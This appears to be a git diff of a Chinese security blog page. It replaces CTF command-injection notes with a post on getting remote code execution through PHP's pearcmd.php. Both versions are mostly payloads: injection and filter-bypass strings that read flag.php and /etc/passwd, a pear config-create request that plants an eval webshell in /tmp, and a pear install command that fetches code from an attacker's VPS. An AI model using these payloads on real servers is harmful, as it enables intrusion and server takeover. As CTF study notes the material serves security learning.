@@ -20,20 +20,24 @@
     var CONFIG = {"hostname":"qyzy.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="命令注入的本质：系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了 命令注入产生的原因： 1. web网站没有对用户提交的参数进行有效的检测过滤。 2. 操作系统允许一条语句执行多条命令（连接符和管道符） windows操作系统命令 |命令|功能| |----|----| |ping|检测网络连通性| |ipconfig|查看当前ip地址| |netstat|查看网络端口及连接">
+  <meta name="description" content="利用条件 安装了pear扩展 php开启了register_argc_argv选项 docker中默认都开启 register_argc_argv  在命令行模式下获取传入的参数，在web服务的情况下获取url中?后面的内容，无论是否有&#x3D;号   在web中传参有几点需要注意的：  &#x3D;和&amp;会被当成字符串解析 * 每个参数之间需要使用+分割，不能使用空格 * 它的解析不影">
 <meta property="og:type" content="article">
-<meta property="og:title" content="命令执行">
-<meta property="og:url" content="https://qyzy.github.io/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:title" content="pear文件包含">
+<meta property="og:url" content="https://qyzy.github.io/2023/07/28/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
 <meta property="og:site_name" content="Welcome To QYZY&#39;s Blog">
-<meta property="og:description" content="命令注入的本质：系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了 命令注入产生的原因： 1. web网站没有对用户提交的参数进行有效的检测过滤。 2. 操作系统允许一条语句执行多条命令（连接符和管道符） windows操作系统命令 |命令|功能| |----|----| |ping|检测网络连通性| |ipconfig|查看当前ip地址| |netstat|查看网络端口及连接">
+<meta property="og:description" content="利用条件 安装了pear扩展 php开启了register_argc_argv选项 docker中默认都开启 register_argc_argv  在命令行模式下获取传入的参数，在web服务的情况下获取url中?后面的内容，无论是否有&#x3D;号   在web中传参有几点需要注意的：  &#x3D;和&amp;会被当成字符串解析 * 每个参数之间需要使用+分割，不能使用空格 * 它的解析不影">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-01-14T15:15:16.000Z">
-<meta property="article:modified_time" content="2023-04-23T09:35:19.652Z">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png">
+<meta property="article:published_time" content="2023-07-28T07:30:47.000Z">
+<meta property="article:modified_time" content="2023-07-28T07:37:42.435Z">
 <meta property="article:author" content="竹云">
-<meta property="article:tag" content="命令执行">
+<meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png">
 
-<link rel="canonical" href="https://qyzy.github.io/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+<link rel="canonical" href="https://qyzy.github.io/2023/07/28/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
 
 
 <script id="page-configurations">
@@ -46,7 +50,7 @@
   };
 </script>
 
-  <title>命令执行 | Welcome To QYZY's Blog</title>
+  <title>pear文件包含 | Welcome To QYZY's Blog</title>
   
 
 
@@ -161,7 +165,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/07/28/pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
@@ -174,7 +178,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          命令执行
+          pear文件包含
         </h1>
 
         <div class="post-meta">
@@ -183,16 +187,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-01-14 23:15:16" itemprop="dateCreated datePublished" datetime="2023-01-14T23:15:16+08:00">2023-01-14</time>
+              <time title="创建时间：2023-07-28 15:30:47 / 修改时间：15:37:42" itemprop="dateCreated datePublished" datetime="2023-07-28T15:30:47+08:00">2023-07-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:35:19" itemprop="dateModified" datetime="2023-04-23T17:35:19+08:00">2023-04-23</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -214,95 +212,32 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>命令注入的本质：<strong>系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了</strong><br />
-命令注入产生的原因：<br />
-1. web网站没有对用户提交的参数进行有效的检测过滤。<br />
-2. 操作系统允许一条语句执行多条命令（连接符和管道符）</p>
-<p>windows操作系统命令 |命令|功能| |----|----| |ping|检测网络连通性|
-|ipconfig|查看当前ip地址| |netstat|查看网络端口及连接情况| |net
-uesr|查看、增加、删除当前系统用户| |net
-localgroup|查看、增加、删除当前系统用户组|
-|dir|列出当前目录下的文件和子目录信息| |req|注册表及其相关操作|
-|systeminfo|查看当前计算机的综合信息|
-|tasklist|显示当前运行的进程信息（可查看PID）|</p>
-<p>linux操作系统命令 |命令|功能| |----|----|
-|ifconfig|查看当前ip、mac等信息| |netstat|查看网络端口及连接情况|
-|whoami|查看当前用户| |cat|查看文件内容|
-|ls|查看当前目录下的文件和子目录信息| |useradd|添加用户|
-|userdel|删除用户| |passwd|修改用户密码|</p>
-<table>
-<colgroup>
-<col style="width: 72%" />
-<col style="width: 27%" />
-</colgroup>
-<thead>
-<tr class="header">
-<th>命令格式</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>command1 &amp; command2（windows）command1； command2（linux）</td>
-<td>先后执行command1和command2，无论command1是否执行成功</td>
-</tr>
-<tr class="even">
-<td>command1 &amp;&amp; command2</td>
-<td>先后执行command1和command2，只有command1执行成功时才执行command2</td>
-</tr>
-<tr class="odd">
-<td>command1||command2</td>
-<td>先后执行command1和command2，只有command1执行失败时才执行command2</td>
-</tr>
-<tr class="even">
-<td>command1|command2</td>
-<td>|是管道符，将command1执行的结果传递给command2</td>
-</tr>
-</tbody>
-</table>
-<h2 id="section">------</h2>
-<hr />
-<p>PHP最后一条语句可以没有分号。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = system(&quot;cp flag.php 1.txt&quot;);</span><br></pre></td></tr></table></figure>
-反引号`和system函数作用相同 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = `cp flag.php 1.txt`</span><br></pre></td></tr></table></figure> 嵌套执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;);</span><br></pre></td></tr></table></figure>
-tac倒序输出文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = include%0a$_GET[1];&amp;1=/etc/passwd</span><br><span class="line"></span><br><span class="line">1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure> 语言结构（不需要使用括号）
-echo print isset unset include require</p>
-<p>data伪协议 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain;&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure> &gt; 短标签 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=php system(&#x27;cp flag.php 1.txt&#x27;);?&gt;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>phpinfo()的返回值是1</p>
-</blockquote>
-<blockquote>
-<p>print_r(get_defined_vars());<br />
-输出当前所有变量<br />
-array_pop(next(get_defined_vars()));<br />
-弹出数组的值<br />
-eval()即可执行</p>
-</blockquote>
-<blockquote>
-<p>/&gt;dev/null 2&gt;&amp;1<br />
-无回显，可用双写绕过<br />
-<code>?c=ls;ls</code><br />
-第一个命令正常输出<br />
-<code>&amp;&amp;</code></p>
-</blockquote>
-<blockquote>
-<p>%20 %09 {$IFS}代替空格</p>
-</blockquote>
-<blockquote>
-<p><code>?c=nl&lt;flag.php&gt;</code></p>
-</blockquote>
-<p>上传文件表单，抓包，将内容改为 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#bin/sh</span><br><span class="line"></span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>
-并将c参数改为<code>.%20/???/????????[@-[]</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(())--&gt;0  </span><br><span class="line">~$(())--&gt;-0  </span><br><span class="line">$((~$(())))--&gt;-1</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>构造数字</p>
-</blockquote>
-<p>文件读取<br />
-* file_get_contents * highlight_file * show_source</p>
-<p>包含文件后
-<code>var_dump(get_defined_vars())</code>或<code>echo $flag</code></p>
-<p>查看目录<br />
-<code>print_r(scandir('.'));</code></p>
-<p>curl <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;file://var/www/html/flag.php&quot;;</span><br><span class="line"> </span><br><span class="line">$ch = curl_init();</span><br><span class="line"> </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line"> </span><br><span class="line">curl_close($ch);</span><br><span class="line"> </span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+        <h1 id="利用条件">利用条件</h1>
+<p>安装了pear扩展 php开启了<code>register_argc_argv</code>选项</p>
+<p>docker中默认都开启</p>
+<h1 id="register_argc_argv">register_argc_argv</h1>
+<p><img src="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png" />
+在命令行模式下获取传入的参数，在web服务的情况下获取url中<code>?</code>后面的内容，<em><strong>无论是否有<code>=</code>号</strong>
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png" />
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png" />
+在web中传参有几点需要注意的： </em>
+<code>=</code>和<code>&amp;</code>会被当成字符串解析 *
+每个参数之间需要使用<code>+</code>分割，不能使用空格 *
+它的解析不影响正常的GET传参 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/fbd8e7bc4f0bc9c6.png" /></p>
+<h1 id="pearcmd.php">pearcmd.php</h1>
+<p>一般在docker中的默认安装目录为<code>/usr/local/lib/php</code>,也有可能因为版本不同在<code>/usr/share/php/pearcmd.php</code></p>
+<p>pear/pcel是一个命令行工具。如果我们能够包含其中的文件，并控制输入的参数，就可以通过它执行命令。</p>
+<h2 id="config-create">config-create</h2>
+<p>创建配置文件，可以在不出网的情况下挂马。<br />
+第一个参数为写入的内容，但必须以<code>/</code>开头，第二个参数为写入文件的路径。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure> 发送时需要抓包发送，不然会被url编码 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/a57d4a9d1ba01220.png" />
+然后包含<code>/tmp/test.php</code>就可以RCE了</p>
+<h2 id="install">install</h2>
+<p>需要靶机出网 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>
+会从vps上下载<code>test1.php</code>到<code>/tmp/pear/download/</code>目录，我们可以使用<code>--installroot</code>选项指定安装目录
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure></p>
 
     </div>
 
@@ -312,7 +247,7 @@ eval()即可执行</p>
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># 命令执行</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
           </div>
 
         
@@ -321,12 +256,12 @@ eval()即可执行</p>
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/12/09/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B/" rel="prev" title="字符编码那些事">
-      <i class="fa fa-chevron-left"></i> 字符编码那些事
+    <a href="/2023/05/10/LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/" rel="prev" title="LaTeX数学公式">
+      <i class="fa fa-chevron-left"></i> LaTeX数学公式
     </a></div>
       <div class="post-nav-item">
-    <a href="/2023/01/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="next" title="文件包含">
-      文件包含 <i class="fa fa-chevron-right"></i>
+    <a href="/2023/07/28/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="phar反序列化">
+      phar反序列化 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -386,7 +321,7 @@ eval()即可执行</p>
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#section"><span class="nav-number">1.</span> <span class="nav-text">------</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#register_argc_argv"><span class="nav-number">2.</span> <span class="nav-text">register_argc_argv</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#pearcmd.php"><span class="nav-number">3.</span> <span class="nav-text">pearcmd.php</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#config-create"><span class="nav-number">3.1.</span> <span class="nav-text">config-create</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#install"><span class="nav-number">3.2.</span> <span class="nav-text">install</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
